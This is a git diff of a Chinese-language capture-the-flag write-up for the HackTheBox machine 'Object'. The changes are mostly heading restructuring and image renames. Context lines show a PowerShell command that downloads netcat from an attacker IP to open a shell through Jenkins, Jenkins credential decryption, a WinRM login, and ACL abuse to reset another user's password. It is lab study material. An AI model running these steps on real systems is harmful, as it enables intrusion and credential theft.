@@ -4,7 +4,9 @@ pagination_prev: null
 pagination_next: null
 ---
 
-# 端口扫描
+## 信息收集
+
+### 端口扫描
 ## 全端口扫描
 
 ~~~
@@ -76,20 +78,20 @@ PORT     STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 391.67 seconds
 ~~~
 
-# 80(WEB)
+### Web 80 信息收集
 暴露了一个域名object.htb
 
-![](Pasted%20image%2020250123180929.png)
+![](Pasted_image_20250123180929.png)
 
 还存在一个jenkins的登录页
 
-![](Pasted%20image%2020250123181040.png)
+![](Pasted_image_20250123181040.png)
 
 尝试创建一个新用户，成功登陆
 
-![](Pasted%20image%2020250123181217.png)
+![](Pasted_image_20250123181217.png)
 
-![](Pasted%20image%2020250123181903.png)
+![](Pasted_image_20250123181903.png)
 注入shell
 ~~~
 Invoke-WebRequest -Uri "http://10.10.16.4:80/nc64.exe" -OutFile "C:\programdata\nc64.exe"
@@ -97,21 +99,21 @@ Invoke-WebRequest -Uri "http://10.10.16.4:80/nc64.exe" -OutFile "C:\programdata\
 
 但是发现没有选项build now，先看看8080端口吧
 
-![](Pasted%20image%2020250123182441.png)
+![](Pasted_image_20250123182441.png)
 
-# 8080(WEB)
+### Web 8080 信息收集
 
 8080也是个jenkins的登录页
 
-![](Pasted%20image%2020250123182600.png)
+![](Pasted_image_20250123182600.png)
 
 这里再次注册的时候告诉我用户名已经被使用了，应该是同一套系统
 
-![](Pasted%20image%2020250123182726.png)
+![](Pasted_image_20250123182726.png)
 
 直接访问build的url显示被拒绝
 
-![](Pasted%20image%2020250123190452.png)
+![](Pasted_image_20250123190452.png)
 
 在build的configure页面可以选择定时build和远程build 详情看[jenkins](#jenkins)
 查看防火墙规则
@@ -407,6 +409,10 @@ C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\lizitest>powershell -c 
 </user>
 ~~~
 
+## 漏洞利用
+
+### Jenkins 凭据解密
+
 可以尝试破解jinkins的密码
 github上有两个项目可以解密，
 需要config.xml、master.key和hudson.util.Secret(二进制文件，使用base64编码后再传输)
@@ -549,6 +555,10 @@ WINRM       10.10.11.132    5985   JENKINS          [+] object.local\oliver:c1cd
                                         
 ~~~
 
+## 权限提升
+
+### BloodHound 分析与 ACL 提权
+
 利用sharphound.ps1进行信息搜集
 
 ~~~
@@ -558,7 +568,7 @@ WINRM       10.10.11.132    5985   JENKINS          [+] object.local\oliver:c1cd
 
 发现oliver用户可以强制更改smith的密码
 
-![](Pasted%20image%2020250124220049.png)
+![](Pasted_image_20250124220049.png)
 
 借助poerview进行密码更改，因为这里已经是在oliver的上下文中，无需提供credential
 
@@ -773,7 +783,7 @@ Mode                LastWriteTime         Length Name
 
 查看Engines.xls，发现记载了密码
 
-![](Pasted%20image%2020250126143717.png)
+![](Pasted_image_20250126143717.png)
 
 试出来一个成功的密码
 
